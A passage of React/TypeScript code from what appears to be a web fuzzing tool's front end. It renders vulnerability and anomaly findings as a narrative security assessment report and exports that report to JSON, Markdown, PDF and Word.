                        {fullAiReport.anomalies.items.slice(0, 10).map((anomaly: any, i: number) => (
                          <TableRow key={i}>
                            <TableCell>
                              <Chip label={anomaly.anomaly_type} size="small" color="warning" />
                            </TableCell>
                            <TableCell>{anomaly.description}</TableCell>
                            <TableCell align="right">{anomaly.score?.toFixed(2)}</TableCell>
                            <TableCell align="right">{anomaly.deviation?.toFixed(2)}σ</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>
                </Box>
              )}

              <Divider />

              {/* Response Categories */}
              {fullAiReport.categories && (
                <Box sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                    📁 Response Categories
                  </Typography>
                  <Grid container spacing={1}>
                    {Object.entries(fullAiReport.categories.summary || {}).map(([category, count]) => (
                      <Grid item xs={6} sm={4} md={3} key={category}>
                        <Paper sx={{ p: 1.5, textAlign: "center", bgcolor: alpha(
                          category === "success" ? "#10b981" :
                          category === "client_error" ? "#f59e0b" :
                          category === "server_error" ? "#ef4444" :
                          category === "interesting" ? "#8b5cf6" :
                          category === "rate_limited" || category === "blocked" ? "#dc2626" :
                          "#6b7280", 0.1
                        )}}>
                          <Typography variant="h5" fontWeight={700}>{count as number}</Typography>
                          <Typography variant="caption" color="text.secondary">{category.replace("_", " ")}</Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>
                </Box>
              )}

              <Divider />

              {/* Differential Analysis */}
              {fullAiReport.differential && fullAiReport.differential.interesting_count > 0 && (
                <Box sx={{ p: 3 }}>
                  <Typography variant="h6" gutterBottom sx={{ display: "flex", alignItems: "center", gap: 1 }}>
                    🔄 Differential Analysis
                  </Typography>
                  <Alert severity="info" sx={{ mb: 2 }}>
                    Found <strong>{fullAiReport.differential.interesting_count}</strong> potentially interesting responses that differ significantly from baseline.
                  </Alert>
                  <Typography variant="body2" color="text.secondary">
                    These responses showed notable differences in status codes, content length, or response times compared to the baseline request.
                  </Typography>
                </Box>
              )}
            </Box>
          ) : (
            <Box sx={{ p: 4, textAlign: "center" }}>
              <CircularProgress />
              <Typography sx={{ mt: 2 }}>Loading report...</Typography>
            </Box>
          )}
        </DialogContent>
        <DialogActions sx={{ px: 3, py: 2 }}>
          <Button
            variant="outlined"
            startIcon={<DownloadIcon />}
            onClick={() => {
              const reportJson = JSON.stringify(fullAiReport, null, 2);
              const blob = new Blob([reportJson], { type: "application/json" });
              const url = URL.createObjectURL(blob);
              const a = document.createElement("a");
              a.href = url;
              a.download = `ai-security-report-${new Date().toISOString().split("T")[0]}.json`;
              a.click();
              URL.revokeObjectURL(url);
            }}
          >
            Download JSON
          </Button>
          <Button onClick={() => setShowFullReportDialog(false)} variant="contained">
            Close
          </Button>
        </DialogActions>
      </Dialog>

      {/* Written Security Report Dialog - Narrative Format */}
      <Dialog
        open={showWrittenReportDialog}
        onClose={() => setShowWrittenReportDialog(false)}
        maxWidth="md"
        fullWidth
        PaperProps={{ sx: { maxHeight: "90vh" } }}
      >
        <DialogTitle sx={{ display: "flex", alignItems: "center", justifyContent: "space-between", bgcolor: alpha("#059669", 0.05) }}>
          <Box sx={{ display: "flex", alignItems: "center", gap: 1 }}>
            <DescriptionIcon sx={{ color: "#059669" }} />
            <Typography variant="h6">Security Assessment Report</Typography>
          </Box>
          <Typography variant="caption" color="text.secondary">
            Generated: {new Date().toLocaleString()}
          </Typography>
        </DialogTitle>
        <DialogContent dividers sx={{ p: 3 }}>
          {smartDetectionResults ? (
            <Box sx={{ fontFamily: "'Inter', 'Roboto', sans-serif" }}>
              {/* Report Header */}
              <Box sx={{ textAlign: "center", mb: 4, pb: 3, borderBottom: `2px solid ${alpha("#059669", 0.2)}` }}>
                <Typography variant="h4" fontWeight={700} gutterBottom>
                  Fuzzing Security Assessment Report
                </Typography>
                <Typography variant="subtitle1" color="text.secondary">
                  Automated Vulnerability Analysis • VRAgent Smart Detection
                </Typography>
                <Box sx={{ mt: 2, display: "flex", justifyContent: "center", gap: 2 }}>
                  <Chip 
                    label={`Target: ${config.targetUrl || "N/A"}`}
                    variant="outlined"
                    size="small"
                  />
                  <Chip 
                    label={`Responses Analyzed: ${results.length}`}
                    variant="outlined"
                    size="small"
                  />
                </Box>
              </Box>

              {/* Executive Summary */}
              <Box sx={{ mb: 4 }}>
                <Typography variant="h5" fontWeight={700} gutterBottom sx={{ color: "#059669", display: "flex", alignItems: "center", gap: 1 }}>
                  <AssessmentIcon /> Executive Summary
                </Typography>
                <Paper sx={{ p: 3, bgcolor: alpha(
                  smartDetectionResults.summary?.risk_level === "critical" ? "#dc2626" :
                  smartDetectionResults.summary?.risk_level === "high" ? "#f59e0b" :
                  smartDetectionResults.summary?.risk_level === "medium" ? "#eab308" :
                  "#10b981", 0.05
                ), borderLeft: `4px solid ${
                  smartDetectionResults.summary?.risk_level === "critical" ? "#dc2626" :
                  smartDetectionResults.summary?.risk_level === "high" ? "#f59e0b" :
                  smartDetectionResults.summary?.risk_level === "medium" ? "#eab308" :
                  "#10b981"
                }` }}>
                  <Typography variant="body1" paragraph sx={{ lineHeight: 1.8 }}>
                    This automated security assessment analyzed <strong>{results.length} HTTP responses</strong> from the 
                    target endpoint <strong>{config.targetUrl || "the configured target"}</strong>. The analysis utilized 50+ 
                    detection signatures to identify potential vulnerabilities including SQL injection, Cross-Site 
                    Scripting (XSS), command injection, path traversal, and other common web application security flaws.
                  </Typography>
                  
                  <Typography variant="body1" paragraph sx={{ lineHeight: 1.8 }}>
                    <strong>Overall Risk Assessment:</strong> The target has been assigned a risk score of 
                    <Chip 
                      label={`${smartDetectionResults.summary?.risk_score || 0}/100`}
                      size="small"
                      color={
                        smartDetectionResults.summary?.risk_level === "critical" ? "error" :
                        smartDetectionResults.summary?.risk_level === "high" ? "warning" :
                        "success"
                      }
                      sx={{ mx: 1 }}
                    />
                    corresponding to a <strong>{smartDetectionResults.summary?.risk_level?.toUpperCase() || "UNKNOWN"}</strong> risk 
                    level. This assessment identified <strong>{smartDetectionResults.summary?.findings_count || 0} potential 
                    vulnerabilities</strong> and <strong>{smartDetectionResults.summary?.anomalies_count || 0} anomalous 
                    behaviors</strong> that warrant further investigation.
                  </Typography>

                  {smartDetectionResults.summary?.risk_level === "critical" || smartDetectionResults.summary?.risk_level === "high" ? (
                    <Alert severity="error" sx={{ mt: 2 }}>
                      <Typography variant="body2">
                        <strong>Immediate Action Required:</strong> Critical or high-severity vulnerabilities have been 
                        detected. It is strongly recommended to address these findings before deploying to production.
                      </Typography>
                    </Alert>
                  ) : smartDetectionResults.summary?.risk_level === "medium" ? (
                    <Alert severity="warning" sx={{ mt: 2 }}>
                      <Typography variant="body2">
                        <strong>Review Recommended:</strong> Medium-severity findings have been identified. While not 
                        immediately critical, these should be reviewed and addressed in a timely manner.
                      </Typography>
                    </Alert>
                  ) : (
                    <Alert severity="success" sx={{ mt: 2 }}>
                      <Typography variant="body2">
                        <strong>Good Security Posture:</strong> No critical vulnerabilities were detected in this 
                        assessment. Continue monitoring and perform regular security testing.
                      </Typography>
                    </Alert>
                  )}
                </Paper>
              </Box>

              {/* Vulnerability Findings */}
              {smartDetectionResults.vulnerabilities && smartDetectionResults.vulnerabilities.length > 0 && (
                <Box sx={{ mb: 4 }}>
                  <Typography variant="h5" fontWeight={700} gutterBottom sx={{ color: "#dc2626", display: "flex", alignItems: "center", gap: 1 }}>
                    <BugReportIcon /> Vulnerability Findings
                  </Typography>
                  
                  <Typography variant="body1" paragraph sx={{ lineHeight: 1.8 }}>
                    The analysis identified <strong>{smartDetectionResults.vulnerabilities.length} potential security 
                    vulnerabilities</strong>. Each finding is detailed below with severity classification, evidence, 
                    and remediation recommendations.
                  </Typography>

                  {smartDetectionResults.vulnerabilities.map((vuln: any, index: number) => (
                    <Paper key={index} sx={{ 
                      p: 3, 
                      mb: 2, 
                      bgcolor: alpha(
                        vuln.severity === "critical" ? "#dc2626" :
                        vuln.severity === "high" ? "#f59e0b" :
                        vuln.severity === "medium" ? "#eab308" :
                        "#3b82f6", 0.03
                      ),
                      borderLeft: `4px solid ${
                        vuln.severity === "critical" ? "#dc2626" :
                        vuln.severity === "high" ? "#f59e0b" :
                        vuln.severity === "medium" ? "#eab308" :
                        "#3b82f6"
                      }`
                    }}>
                      <Box sx={{ display: "flex", alignItems: "center", gap: 2, mb: 2 }}>
                        <Typography variant="h6" fontWeight={600}>
                          Finding #{index + 1}: {vuln.title || vuln.vuln_type || "Security Issue"}
                        </Typography>
                        <Chip 
                          label={vuln.severity?.toUpperCase() || "UNKNOWN"}
                          size="small"
                          color={
                            vuln.severity === "critical" || vuln.severity === "high" ? "error" :
                            vuln.severity === "medium" ? "warning" : "info"
                          }
                        />
                        {vuln.confidence && (
                          <Chip 
                            label={`${(vuln.confidence * 100).toFixed(0)}% confidence`}
                            size="small"
                            variant="outlined"
                          />
                        )}
                      </Box>

                      <Typography variant="body1" paragraph sx={{ lineHeight: 1.8 }}>
                        <strong>Description:</strong> {vuln.description || `A potential ${vuln.vuln_type || vuln.title || "security vulnerability"} was detected in the target application. This type of vulnerability can allow attackers to ${
                          vuln.vuln_type?.toLowerCase().includes("sql") ? "execute arbitrary SQL queries against the database, potentially leading to data exfiltration, modification, or deletion" :
                          vuln.vuln_type?.toLowerCase().includes("xss") ? "inject malicious scripts that execute in users' browsers, potentially stealing session cookies or credentials" :
                          vuln.vuln_type?.toLowerCase().includes("command") ? "execute arbitrary system commands on the server, potentially leading to full system compromise" :
                          vuln.vuln_type?.toLowerCase().includes("path") || vuln.vuln_type?.toLowerCase().includes("traversal") ? "access files outside the intended directory, potentially exposing sensitive configuration or data" :
                          vuln.vuln_type?.toLowerCase().includes("ssti") ? "execute server-side template code, potentially leading to remote code execution" :
                          "exploit the application in unintended ways"
                        }.`}
                      </Typography>

                      {vuln.payload && (
                        <Box sx={{ mb: 2 }}>
                          <Typography variant="subtitle2" fontWeight={600}>Triggering Payload:</Typography>
                          <Paper sx={{ p: 2, bgcolor: "background.default", mt: 1 }}>
                            <Typography variant="body2" sx={{ fontFamily: "monospace", wordBreak: "break-all" }}>
                              {vuln.payload}
                            </Typography>
                          </Paper>
                        </Box>
                      )}

                      {vuln.evidence && vuln.evidence.length > 0 && (
                        <Box sx={{ mb: 2 }}>
                          <Typography variant="subtitle2" fontWeight={600}>Evidence:</Typography>
                          <Paper sx={{ p: 2, bgcolor: "background.default", mt: 1 }}>
                            {vuln.evidence.map((e: string, i: number) => (
                              <Typography key={i} variant="body2" sx={{ fontFamily: "monospace", fontSize: "0.85rem", mb: 0.5 }}>
                                • {e}
                              </Typography>
                            ))}
                          </Paper>
                        </Box>
                      )}

                      <Box sx={{ bgcolor: alpha("#10b981", 0.1), p: 2, borderRadius: 1 }}>
                        <Typography variant="subtitle2" fontWeight={600} sx={{ color: "#059669" }}>
                          Recommendation:
                        </Typography>
                        <Typography variant="body2" sx={{ lineHeight: 1.7, mt: 1 }}>
                          {vuln.recommendation || (
                            vuln.vuln_type?.toLowerCase().includes("sql") ? "Implement parameterized queries or prepared statements. Never concatenate user input directly into SQL queries. Use an ORM where possible and ensure proper input validation." :
                            vuln.vuln_type?.toLowerCase().includes("xss") ? "Implement context-aware output encoding for all user-controlled data. Use Content Security Policy (CSP) headers. Consider using templating frameworks with automatic escaping." :
                            vuln.vuln_type?.toLowerCase().includes("command") ? "Avoid executing system commands with user-controlled input. If necessary, use allowlists for permitted values and escape shell metacharacters." :
                            vuln.vuln_type?.toLowerCase().includes("path") || vuln.vuln_type?.toLowerCase().includes("traversal") ? "Validate and sanitize file paths. Use a whitelist of allowed files/directories. Implement proper access controls and avoid exposing internal file structures." :
                            "Implement proper input validation, output encoding, and follow the principle of least privilege. Consult OWASP guidelines for specific remediation steps."
                          )}
                        </Typography>
                      </Box>

                      {vuln.false_positive_likelihood && (
                        <Typography variant="caption" color="text.secondary" sx={{ mt: 2, display: "block" }}>
                          Note: False positive likelihood is assessed as {vuln.false_positive_likelihood}. Manual verification is recommended.
                        </Typography>
                      )}
                    </Paper>
                  ))}
                </Box>
              )}

              {/* Anomaly Analysis */}
              {smartDetectionResults.anomalies && smartDetectionResults.anomalies.length > 0 && (
                <Box sx={{ mb: 4 }}>
                  <Typography variant="h5" fontWeight={700} gutterBottom sx={{ color: "#f59e0b", display: "flex", alignItems: "center", gap: 1 }}>
                    <WarningIcon /> Anomaly Analysis
                  </Typography>
                  
                  <Typography variant="body1" paragraph sx={{ lineHeight: 1.8 }}>
                    The statistical analysis detected <strong>{smartDetectionResults.anomalies.length} anomalous 
                    responses</strong> that deviate significantly from the baseline behavior. These anomalies may 
                    indicate security issues, misconfigurations, or interesting attack vectors that warrant manual 
                    investigation.
                  </Typography>

                  <TableContainer component={Paper} variant="outlined" sx={{ mb: 2 }}>
                    <Table size="small">
                      <TableHead>
                        <TableRow sx={{ bgcolor: alpha("#f59e0b", 0.1) }}>
                          <TableCell><strong>Anomaly Type</strong></TableCell>
                          <TableCell><strong>Description</strong></TableCell>
                          <TableCell align="right"><strong>Anomaly Score</strong></TableCell>
                          <TableCell align="right"><strong>Deviation (σ)</strong></TableCell>
                        </TableRow>
                      </TableHead>
                      <TableBody>
                        {smartDetectionResults.anomalies.map((anomaly: any, i: number) => (
                          <TableRow key={i}>
                            <TableCell>
                              <Chip label={anomaly.anomaly_type || "Unknown"} size="small" color="warning" />
                            </TableCell>
                            <TableCell>{anomaly.description || "Statistical outlier detected"}</TableCell>
                            <TableCell align="right">{anomaly.score?.toFixed(2) || "N/A"}</TableCell>
                            <TableCell align="right">{anomaly.deviation?.toFixed(2) || "N/A"}σ</TableCell>
                          </TableRow>
                        ))}
                      </TableBody>
                    </Table>
                  </TableContainer>

                  <Typography variant="body2" color="text.secondary" sx={{ fontStyle: "italic" }}>
                    Anomalies with higher deviation scores (σ) indicate responses that differ more significantly from 
                    the norm and should be prioritized for manual review.
                  </Typography>
                </Box>
              )}

              {/* Response Categorization */}
              {smartDetectionResults.categorization && (
                <Box sx={{ mb: 4 }}>
                  <Typography variant="h5" fontWeight={700} gutterBottom sx={{ color: "#6366f1", display: "flex", alignItems: "center", gap: 1 }}>
                    <CategoryIcon /> Response Categorization
                  </Typography>
                  
                  <Typography variant="body1" paragraph sx={{ lineHeight: 1.8 }}>
                    Responses have been categorized based on HTTP status codes, content patterns, and behavioral 
                    indicators. This categorization helps identify patterns in the application's responses to 
                    different payloads.
                  </Typography>

                  <Grid container spacing={2} sx={{ mb: 2 }}>
                    {Object.entries(smartDetectionResults.categorization?.categories || {}).map(([category, count]) => (
                      <Grid item xs={6} sm={4} md={3} key={category}>
                        <Paper sx={{ 
                          p: 2, 
                          textAlign: "center",
                          bgcolor: alpha(
                            category === "success" ? "#10b981" :
                            category === "client_error" ? "#f59e0b" :
                            category === "server_error" ? "#ef4444" :
                            category === "interesting" ? "#8b5cf6" :
                            category === "blocked" || category === "rate_limited" ? "#dc2626" :
                            "#6b7280", 0.1
                          )
                        }}>
                          <Typography variant="h4" fontWeight={700}>{count as number}</Typography>
                          <Typography variant="caption" color="text.secondary">
                            {category.replace(/_/g, " ").replace(/\b\w/g, c => c.toUpperCase())}
                          </Typography>
                        </Paper>
                      </Grid>
                    ))}
                  </Grid>

                  <Typography variant="body2" sx={{ lineHeight: 1.7 }}>
                    <strong>Key insights:</strong> {
                      (smartDetectionResults.categorization?.categories?.server_error || 0) > 0 
                        ? `Server errors (${smartDetectionResults.categorization?.categories?.server_error}) may indicate crash conditions or unhandled exceptions that could be exploited. ` 
                        : ""
                    }
                    {
                      (smartDetectionResults.categorization?.categories?.interesting || 0) > 0 
                        ? `${smartDetectionResults.categorization?.categories?.interesting} responses were flagged as interesting and should be manually reviewed for potential vulnerabilities. ` 
                        : ""
                    }
                    {
                      (smartDetectionResults.categorization?.categories?.blocked || 0) > 0 
                        ? `${smartDetectionResults.categorization?.categories?.blocked} requests were blocked, indicating WAF or rate limiting protection. ` 
                        : ""
                    }
                  </Typography>
                </Box>
              )}

              {/* Methodology */}
              <Box sx={{ mb: 4 }}>
                <Typography variant="h5" fontWeight={700} gutterBottom sx={{ color: "#6b7280", display: "flex", alignItems: "center", gap: 1 }}>
                  <InfoIcon /> Methodology
                </Typography>
                <Paper sx={{ p: 3, bgcolor: alpha("#6b7280", 0.03) }}>
                  <Typography variant="body2" paragraph sx={{ lineHeight: 1.8 }}>
                    This assessment was performed using VRAgent's Smart Detection engine, which employs multiple 
                    detection techniques:
                  </Typography>
                  <Box component="ul" sx={{ pl: 2, mb: 2 }}>
                    <Typography component="li" variant="body2" sx={{ mb: 1 }}>
                      <strong>Pattern-Based Detection:</strong> 50+ signatures for common vulnerability patterns 
                      including SQL injection, XSS, command injection, path traversal, SSTI, XXE, and more.
                    </Typography>
                    <Typography component="li" variant="body2" sx={{ mb: 1 }}>
                      <strong>Statistical Anomaly Detection:</strong> Analysis of response characteristics (status 
                      codes, content length, response time) to identify outliers that may indicate security issues.
                    </Typography>
                    <Typography component="li" variant="body2" sx={{ mb: 1 }}>
                      <strong>Differential Analysis:</strong> Comparison of responses to identify meaningful 
                      differences that could indicate exploitable conditions.
                    </Typography>
                    <Typography component="li" variant="body2">
                      <strong>Response Categorization:</strong> Classification of responses to understand application 
                      behavior patterns and identify security controls.
                    </Typography>
                  </Box>
                  <Alert severity="info">
                    <Typography variant="body2">
                      <strong>Note:</strong> Automated security testing may produce false positives. All findings 
                      should be manually verified before taking remediation action.
                    </Typography>
                  </Alert>
                </Paper>
              </Box>

              {/* Footer */}
              <Box sx={{ textAlign: "center", pt: 3, borderTop: `2px solid ${alpha("#059669", 0.2)}` }}>
                <Typography variant="body2" color="text.secondary">
                  Report generated by VRAgent Smart Detection • {new Date().toLocaleString()}
                </Typography>
                <Typography variant="caption" color="text.secondary">
                  This is an automated assessment. Manual verification of findings is recommended.
                </Typography>
              </Box>
            </Box>
          ) : (
            <Box sx={{ textAlign: "center", py: 4 }}>
              <Typography variant="body1" color="text.secondary">
                No smart detection results available. Run a full analysis first to generate the written report.
              </Typography>
            </Box>
          )}
        </DialogContent>
        <DialogActions sx={{ px: 3, py: 2, flexWrap: "wrap", gap: 1 }}>
          {/* Markdown Export */}
          <Button
            variant="outlined"
            startIcon={<ArticleIcon />}
            onClick={() => {
              const report = smartDetectionResults;
              if (!report) return;
              
              let md = "# 🛡️ Fuzzing Security Assessment Report\n\n";
              md += "---\n\n";
              md += "## 📋 Report Metadata\n\n";
              md += `| **Field** | **Value** |\n`;
              md += `|-----------|----------|\n`;
              md += `| **Target** | \`${config.targetUrl || "N/A"}\` |\n`;
              md += `| **Date** | ${new Date().toLocaleString()} |\n`;
              md += `| **Responses Analyzed** | ${results.length} |\n`;
              md += `| **Tool** | VRAgent Smart Detection |\n\n`;
              
              md += "---\n\n";
              md += "## 📊 Executive Summary\n\n";
              
              const riskEmoji = report.summary?.risk_level === "critical" ? "🔴" : 
                               report.summary?.risk_level === "high" ? "🟠" :
                               report.summary?.risk_level === "medium" ? "🟡" : "🟢";
              
              md += `### Risk Assessment: ${riskEmoji} **${report.summary?.risk_level?.toUpperCase() || "UNKNOWN"}** (${report.summary?.risk_score || 0}/100)\n\n`;
              
              md += `This automated security assessment analyzed **${results.length} HTTP responses** from the target endpoint. `;
              md += `The analysis utilized 50+ detection signatures to identify potential vulnerabilities.\n\n`;
              
              md += "### Summary Statistics\n\n";
              md += `- **Vulnerabilities Found:** ${report.summary?.findings_count || 0}\n`;
              md += `- **Anomalies Detected:** ${report.summary?.anomalies_count || 0}\n`;
              md += `- **Interesting Responses:** ${report.summary?.interesting_count || 0}\n\n`;
              
              if (report.vulnerabilities?.length > 0) {
                md += "---\n\n";
                md += "## 🔴 Vulnerability Findings\n\n";
                
                report.vulnerabilities.forEach((v: any, i: number) => {
                  const sevEmoji = v.severity === "critical" ? "🔴" : 
                                   v.severity === "high" ? "🟠" :
                                   v.severity === "medium" ? "🟡" : "🔵";
                  
                  md += `### ${i + 1}. ${v.title || v.vuln_type || "Security Issue"}\n\n`;
                  md += `**Severity:** ${sevEmoji} ${v.severity?.toUpperCase() || "UNKNOWN"}`;
                  if (v.confidence) md += ` | **Confidence:** ${(v.confidence * 100).toFixed(0)}%`;
                  md += "\n\n";
                  
                  if (v.description) {
                    md += `**Description:** ${v.description}\n\n`;
                  }
                  
                  if (v.payload) {
                    md += `**Triggering Payload:**\n\`\`\`\n${v.payload}\n\`\`\`\n\n`;
                  }
                  
                  if (v.evidence?.length > 0) {
                    md += "**Evidence:**\n";
                    v.evidence.forEach((e: string) => {
                      md += `- \`${e}\`\n`;
                    });
                    md += "\n";
                  }
                  
                  if (v.recommendation) {
                    md += `> 💡 **Recommendation:** ${v.recommendation}\n\n`;
                  }
                  
                  if (v.false_positive_likelihood) {
                    md += `*False Positive Likelihood: ${v.false_positive_likelihood}*\n\n`;
                  }
                });
              }
              
              if (report.anomalies?.length > 0) {
                md += "---\n\n";
                md += "## ⚠️ Anomaly Analysis\n\n";
                md += "The following statistical anomalies were detected:\n\n";
                md += "| # | Type | Description | Score | Deviation |\n";
                md += "|---|------|-------------|-------|----------|\n";
                report.anomalies.forEach((a: any, i: number) => {
                  md += `| ${i + 1} | ${a.anomaly_type || "Unknown"} | ${a.description || "N/A"} | ${a.score?.toFixed(2) || "N/A"} | ${a.deviation?.toFixed(2) || "N/A"}σ |\n`;
                });
                md += "\n";
              }
              
              if (report.categorization?.categories) {
                md += "---\n\n";
                md += "## 📁 Response Categories\n\n";
                md += "| Category | Count |\n";
                md += "|----------|-------|\n";
                Object.entries(report.categorization.categories).forEach(([cat, count]) => {
                  md += `| ${cat.replace(/_/g, " ")} | ${count} |\n`;
                });
                md += "\n";
              }
              
              md += "---\n\n";
              md += "## 📖 Methodology\n\n";
              md += "This assessment was performed using VRAgent's Smart Detection engine:\n\n";
              md += "- **Pattern-Based Detection:** 50+ signatures for common vulnerabilities\n";
              md += "- **Statistical Anomaly Detection:** Analysis of response characteristics\n";
              md += "- **Differential Analysis:** Comparison to identify meaningful differences\n";
              md += "- **Response Categorization:** Classification of application behavior\n\n";
              md += "> ⚠️ **Note:** Automated security testing may produce false positives. All findings should be manually verified.\n\n";
              md += "---\n\n";
              md += `*Report generated by VRAgent Smart Detection on ${new Date().toLocaleString()}*\n`;
              
              const blob = new Blob([md], { type: "text/markdown" });
              const url = URL.createObjectURL(blob);
              const a = document.createElement("a");
              a.href = url;
              a.download = `security-report-${new Date().toISOString().split("T")[0]}.md`;
              a.click();
              URL.revokeObjectURL(url);
            }}
          >
            Export Markdown
          </Button>
          
          {/* PDF Export */}
          <Button
            variant="outlined"
            startIcon={<PictureAsPdfIcon />}
            onClick={() => {
              const report = smartDetectionResults;
              if (!report) return;
              
              const doc = new jsPDF();
              let y = 20;
              const pageWidth = doc.internal.pageSize.getWidth();
              const margin = 20;
              const contentWidth = pageWidth - 2 * margin;
              
              const addPage = () => {
                doc.addPage();
                y = 20;
              };
              
              const checkPageBreak = (height: number) => {
                if (y + height > 270) {
                  addPage();
                }
              };
              
              // Title
              doc.setFontSize(24);
              doc.setFont("helvetica", "bold");
              doc.setTextColor(5, 150, 105);
              doc.text("Security Assessment Report", pageWidth / 2, y, { align: "center" });
              y += 12;
              
              doc.setFontSize(12);
              doc.setFont("helvetica", "normal");
              doc.setTextColor(100, 100, 100);
              doc.text("VRAgent Smart Detection", pageWidth / 2, y, { align: "center" });
              y += 15;
              
              // Metadata box
              doc.setDrawColor(200, 200, 200);
              doc.setFillColor(248, 250, 252);
              doc.roundedRect(margin, y, contentWidth, 30, 3, 3, "FD");
              y += 8;
              
              doc.setFontSize(10);
              doc.setTextColor(60, 60, 60);
              doc.setFont("helvetica", "bold");
              doc.text("Target: ", margin + 5, y);
              doc.setFont("helvetica", "normal");
              doc.text(config.targetUrl || "N/A", margin + 25, y);
              
              doc.setFont("helvetica", "bold");
              doc.text("Date: ", margin + 100, y);
              doc.setFont("helvetica", "normal");
              doc.text(new Date().toLocaleDateString(), margin + 115, y);
              y += 7;
              
              doc.setFont("helvetica", "bold");
              doc.text("Responses: ", margin + 5, y);
              doc.setFont("helvetica", "normal");
              doc.text(results.length.toString(), margin + 35, y);
              
              doc.setFont("helvetica", "bold");
              doc.text("Risk Level: ", margin + 100, y);
              doc.setFont("helvetica", "normal");
              const riskColor = report.summary?.risk_level === "critical" ? [220, 38, 38] :
                               report.summary?.risk_level === "high" ? [245, 158, 11] :
                               report.summary?.risk_level === "medium" ? [234, 179, 8] : [16, 185, 129];
              doc.setTextColor(riskColor[0], riskColor[1], riskColor[2]);
              doc.text(`${report.summary?.risk_level?.toUpperCase() || "UNKNOWN"} (${report.summary?.risk_score || 0}/100)`, margin + 130, y);
              y += 20;
              
              // Executive Summary
              doc.setTextColor(5, 150, 105);
              doc.setFontSize(16);
              doc.setFont("helvetica", "bold");
              doc.text("Executive Summary", margin, y);
              y += 8;
              
              doc.setTextColor(60, 60, 60);
              doc.setFontSize(10);
              doc.setFont("helvetica", "normal");
              const summaryText = `This automated security assessment analyzed ${results.length} HTTP responses from the target endpoint. The analysis utilized 50+ detection signatures to identify potential vulnerabilities including SQL injection, XSS, command injection, and more.`;
              const summaryLines = doc.splitTextToSize(summaryText, contentWidth);
              doc.text(summaryLines, margin, y);
              y += summaryLines.length * 5 + 5;
              
              // Stats
              doc.setFont("helvetica", "bold");
              doc.text(`• Vulnerabilities Found: ${report.summary?.findings_count || 0}`, margin + 5, y);
              y += 5;
              doc.text(`• Anomalies Detected: ${report.summary?.anomalies_count || 0}`, margin + 5, y);
              y += 5;
              doc.text(`• Interesting Responses: ${report.summary?.interesting_count || 0}`, margin + 5, y);
              y += 15;
              
              // Vulnerabilities
              if (report.vulnerabilities?.length > 0) {
                checkPageBreak(20);
                doc.setTextColor(220, 38, 38);
                doc.setFontSize(16);
                doc.setFont("helvetica", "bold");
                doc.text(`Vulnerability Findings (${report.vulnerabilities.length})`, margin, y);
                y += 10;
                
                report.vulnerabilities.forEach((v: any, i: number) => {
                  checkPageBreak(40);
                  
                  // Severity badge
                  const sevColor = v.severity === "critical" ? [220, 38, 38] :
                                   v.severity === "high" ? [245, 158, 11] :
                                   v.severity === "medium" ? [234, 179, 8] : [59, 130, 246];
                  doc.setFillColor(sevColor[0], sevColor[1], sevColor[2]);
                  doc.roundedRect(margin, y - 4, 20, 6, 1, 1, "F");
                  doc.setTextColor(255, 255, 255);
                  doc.setFontSize(7);
                  doc.text(v.severity?.toUpperCase() || "N/A", margin + 10, y, { align: "center" });
                  
                  // Title
                  doc.setTextColor(30, 30, 30);
                  doc.setFontSize(11);
                  doc.setFont("helvetica", "bold");
                  doc.text(`${i + 1}. ${v.title || v.vuln_type || "Security Issue"}`, margin + 25, y);
                  y += 7;
                  
                  doc.setTextColor(60, 60, 60);
                  doc.setFontSize(9);
                  doc.setFont("helvetica", "normal");
                  
                  if (v.payload) {
                    doc.setFont("helvetica", "bold");
                    doc.text("Payload: ", margin + 5, y);
                    doc.setFont("helvetica", "normal");
                    const payloadText = v.payload.length > 80 ? v.payload.substring(0, 80) + "..." : v.payload;
                    doc.text(payloadText, margin + 25, y);
                    y += 5;
                  }
                  
                  if (v.evidence?.length > 0) {
                    doc.setFont("helvetica", "bold");
                    doc.text("Evidence: ", margin + 5, y);
                    doc.setFont("helvetica", "normal");
                    const evidenceText = v.evidence.slice(0, 2).join(", ");
                    const evidenceLines = doc.splitTextToSize(evidenceText.substring(0, 100), contentWidth - 30);
                    doc.text(evidenceLines, margin + 30, y);
                    y += evidenceLines.length * 4 + 2;
                  }
                  
                  if (v.recommendation) {
                    checkPageBreak(15);
                    doc.setFillColor(219, 234, 254);
                    const recLines = doc.splitTextToSize(`Recommendation: ${v.recommendation}`, contentWidth - 15);
                    doc.roundedRect(margin + 5, y - 3, contentWidth - 10, recLines.length * 4 + 4, 2, 2, "F");
                    doc.setTextColor(30, 64, 175);
                    doc.setFontSize(8);
                    doc.text(recLines, margin + 10, y);
                    y += recLines.length * 4 + 8;
                  }
                  
                  y += 5;
                });
              }
              
              // Anomalies
              if (report.anomalies?.length > 0) {
                checkPageBreak(30);
                doc.setTextColor(245, 158, 11);
                doc.setFontSize(16);
                doc.setFont("helvetica", "bold");
                doc.text(`Anomalies Detected (${report.anomalies.length})`, margin, y);
                y += 10;
                
                doc.setTextColor(60, 60, 60);
                doc.setFontSize(9);
                
                report.anomalies.slice(0, 10).forEach((a: any, i: number) => {
                  checkPageBreak(8);
                  doc.setFont("helvetica", "bold");
                  doc.text(`${i + 1}. ${a.anomaly_type || "Unknown"}:`, margin + 5, y);
                  doc.setFont("helvetica", "normal");
                  const desc = a.description?.substring(0, 60) || "N/A";
                  doc.text(`${desc} (Score: ${a.score?.toFixed(2) || "N/A"})`, margin + 40, y);
                  y += 6;
                });
                y += 10;
              }
              
              // Footer
              checkPageBreak(20);
              doc.setDrawColor(200, 200, 200);
              doc.line(margin, y, pageWidth - margin, y);
              y += 8;
              doc.setTextColor(100, 100, 100);
              doc.setFontSize(8);
              doc.setFont("helvetica", "italic");
              doc.text("This is an automated assessment. Manual verification of findings is recommended.", pageWidth / 2, y, { align: "center" });
              y += 5;
              doc.text(`Generated by VRAgent Smart Detection • ${new Date().toLocaleString()}`, pageWidth / 2, y, { align: "center" });
              
              doc.save(`security-report-${new Date().toISOString().split("T")[0]}.pdf`);
            }}
          >
            Export PDF
          </Button>
          
          {/* Word Export */}
          <Button
            variant="outlined"
            startIcon={<DescriptionIcon />}
            onClick={async () => {
              const report = smartDetectionResults;
              if (!report) return;
              
              const children: any[] = [];
              
              // Title
              children.push(
                new Paragraph({
                  children: [
                    new TextRun({
                      text: "🛡️ Security Assessment Report",
                      bold: true,
                      size: 48,
                      color: "059669",
